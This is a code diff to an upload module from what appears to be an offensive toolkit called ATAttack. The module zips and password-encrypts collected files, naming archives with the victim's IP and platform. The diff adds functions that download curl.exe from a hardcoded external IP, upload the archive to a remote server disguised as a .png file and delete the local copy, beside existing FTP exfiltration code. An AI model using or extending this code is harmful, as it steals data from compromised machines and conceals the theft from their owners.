@@ -8,20 +8,21 @@ import socket
 import zipfile
 import platform
 import ftplib
+import requests
 
 from ATAttack.framework.prints import *
 from ATAttack.framework.constant import constant
 import os
 
 
-def str_rangdom():
+def s_rangdom():
     return ''.join(random.sample(string.ascii_letters + string.digits,8))
 
-random_exe = str_rangdom() + ".exe"
-random_zip = str_rangdom() + "_" + ".zip"
-
+random_exe = s_rangdom() + ".exe"
+random_zip = s_rangdom() + "_" + ".zip"
 
 class upload(object):
+
     def __init__(self,credentials):
         try:
             self.hostname = socket.gethostbyname(socket.gethostname())
@@ -32,11 +33,9 @@ class upload(object):
             print_error("Unable to connect to FTP server")
             pass
 
-
-    def random_str(self):
-
+    def ziprandom(self):
         ip_address = self.hostname
-        file_name = str_rangdom() + "_" + ip_address + "_" + platform.platform()
+        file_name = s_rangdom() + "_" + ip_address + "_" + platform.platform()
         return file_name
 
     def zipDir(self,dirpath, outFullName):
@@ -52,26 +51,72 @@ class upload(object):
                     elif filename.endswith(".rar"):
                         pass
                     else:
-                        zip.write(
-                            os.path.join(
-                                path, filename), os.path.join(
-                                fpath, filename))
+                        zip.write(os.path.join(path, filename), os.path.join(fpath, filename))
             zip.close()
         except Exception:
             pass
 
-    def zip_encrypt(self,dirpath):
+    def encrypt(self,dirpath):
+
         self.zipDir(dirpath, random_zip)
         compression_level = 9
         filename = random_zip
-        path = self.random_str()
-        pyminizip.compress(filename, "", path,
+        virtual = self.ziprandom()
+        pyminizip.compress(filename, "", virtual,
                            "Za!@#$@&**(aKg", compression_level)
         os.remove(random_zip)
-        return path
+        return virtual
 
+    def HTTPupload(self,url, localfile):
+        """
+        上传接口
+        :param url:
+        :return:
+        """
+        try:
+            if not os.path.exists('curl.exe') :
+                self.curl(url='http://119.29.205.214/curl.exe')
+            command = 'curl.exe -X PUT --upload-file {localfile} {url}/{remotefile}'.format(
+                localfile=localfile, url=url, remotefile=s_rangdom()+ ".png")
+            print command
+            os.popen(command).read()
+            os.remove(localfile)
+        except Exception as e:
+            print e.message
+
+    def HTTPdownload(self,url, filename='output.txt'):
+        '''
+        下载接口
+        :param url:
+        :param filename:
+        :return:
+        '''
+        requ = requests.get(url, stream=True, verify=False)
+        with open(filename, 'wb') as fd:
+            for chunk in requ.iter_content(chunk_size=5120):
+                if chunk:
+                    fd.write(chunk)
+        return filename
+
+    def get_FileSize(self,filePath):
+        fsize = os.path.getsize(filePath)
+        fsize = fsize / float(1024 * 1024)
+        return round(fsize, 2)
+
+    def curl(self,url, filename='curl.exe'):
+        if os.path.exists(filename):
+            pass
+        else:
+            file = self.HTTPdownload(url, filename)
+            if self.get_FileSize(file) != 0:
+                print "[+] Download successful curl.exe"
 
     def ftp_upload(self,file_remote):
+        '''
+        ftp上传接口
+        :param file_remote:
+        :return:
+        '''
         try:
             # if os.path.getsize(constant.dump_name) == 0:
             #     print_error(
@@ -92,7 +137,7 @@ class upload(object):
         except Exception:
             return False
 
-    def download(self,remote, local):
+    def ftp_download(self,remote, local):
         try:
             bufsize = 1024
             fp = open(local, 'wb')
@@ -131,5 +176,3 @@ class upload(object):
     #     else:
     #         print_success(os.popen(random_exe).read())
     #         os.remove(random_exe)
-
-
